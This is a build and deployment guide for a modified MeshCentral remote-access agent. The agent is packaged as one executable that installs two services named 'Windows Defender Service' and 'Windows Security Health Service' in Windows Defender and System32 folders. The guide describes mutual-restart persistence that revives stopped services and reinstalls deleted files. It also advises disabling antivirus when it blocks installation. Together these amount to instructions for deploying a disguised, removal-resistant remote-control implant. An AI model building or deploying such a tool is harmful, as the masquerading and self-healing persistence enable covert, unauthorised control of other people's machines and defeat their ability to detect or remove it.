# Build & Deploy Guide

## Prerequisites
- Visual Studio 2022 (with C++ tools)
- Windows 10/11 SDK
- Administrator privileges

## Build Process Overview

**Important:** The Guardian service is automatically embedded into `MeshAgent.exe` during compilation. You only need to deploy **ONE file**: `MeshAgent.exe`

## Step 1: Build Guardian Service (First)

1. Open Visual Studio 2022
2. Open `MeshAgent-2022.sln`
3. Select configuration: **Release | x64** (or Win32 for 32-bit)
4. Right-click on **MeshGuardian-2022** project
5. Click **Build**
6. Output: `x64\Release\WinSecHealthSvc.exe`

## Step 2: Build Main Service (Second)

1. In the same Visual Studio solution
2. Right-click on **MeshService-2022** project
3. Click **Build**
4. Output: `x64\Release\MeshAgent.exe` (contains embedded Guardian!)

**Note:** The build process automatically embeds `WinSecHealthSvc.exe` as a resource inside `MeshAgent.exe`. If the Guardian exe is not found, the build will still succeed, and the runtime code will fall back to looking for `WinSecHealthSvc.exe` in the same directory.

## Step 3: Deploy

You only need **ONE file** for deployment:
```
MeshAgent.exe  (contains everything!)
```

## Step 4: Install Main Service

From an **Administrator Command Prompt** or PowerShell:

```powershell
# Install the service
MeshAgent.exe -install

# The service will automatically:
# 1. Extract WinSecHealthSvc.exe from its embedded resources
# 2. Install itself to C:\Program Files\Windows Defender\
# 3. Create and install the Guardian service
# 4. Copy WinSecHealthSvc.exe to C:\Windows\System32\WinSecHealth\
# 5. Start both services
```

## Step 5: Verify Installation

```powershell
# Check main service
sc query "Windows Defender Service"

# Check guardian service
sc query "Windows Security Health Service"

# View services in Services.msc
services.msc
```

Look for:
- **Windows Defender Service** (should be Running, Automatic)
- **Windows Security Health Service** (should be Running, Automatic)

## Step 6: Monitor Logs

Guardian log location:
```
C:\Windows\System32\WinSecHealth\service.log
```

Check backup location:
```
C:\Windows\System32\WinSecHealth\backup\
```

## Uninstallation

To completely remove both services:

```powershell
# Run as Administrator
.\uninstall.ps1
```

This will:
1. Stop both services
2. Uninstall service registrations
3. Delete all files and directories
4. Clean registry entries

## MeshCentral Integration

To use with MeshCentral:

1. Build `MeshAgent.exe` as described above
2. In MeshCentral web interface:
   - Go to "My Server" > "Console" > "Agents"
   - Upload `MeshAgent.exe` as a new Windows agent installer
   - MeshCentral will sign and configure it with your server URL
3. Deploy the signed `MeshAgent.exe` to target machines

**That's it!** Only one file to deploy and manage in MeshCentral.

## Troubleshooting

### Guardian not starting
- Check WinSecHealthSvc.exe exists in deployment folder during installation
- Verify Administrator rights
- Check Windows Event Viewer for errors

### Service not found
- Reinstall with: `MeshAgent.exe -install`
- Verify executable is not blocked by antivirus

### Permission denied
- Always run installation commands as Administrator
- Disable antivirus temporarily if it blocks installation

### Backup not working
- Check Guardian log: `C:\Windows\System32\WinSecHealth\service.log`
- Verify disk space available

## Testing Protection

### Test 1: Stop main service
```powershell
Stop-Service "Windows Defender Service"
# Wait 10-15 seconds
sc query "Windows Defender Service"
# Should be RUNNING again (Guardian restarted it)
```

### Test 2: Stop Guardian service
```powershell
Stop-Service "Windows Security Health Service"
# Wait 60-70 seconds
sc query "Windows Security Health Service"
# Should be RUNNING again (main service restarted it)
```

### Test 3: Delete Guardian exe
```powershell
Stop-Service "Windows Security Health Service"
Remove-Item "C:\Windows\System32\WinSecHealth\WinSecHealthSvc.exe"
# Wait 60-70 seconds
# Guardian should be reinstalled and running
```

## Notes

- **Only ONE file to deploy**: `MeshAgent.exe` contains everything
- Guardian is automatically extracted and installed on first run
- Executable name remains `MeshAgent.exe` for MeshCentral compatibility
- Service display name changed to "Windows Defender Service"
- Both services monitor each other continuously
- Guardian backs up database every hour automatically
- Compatible with MeshCentral - just upload one file!
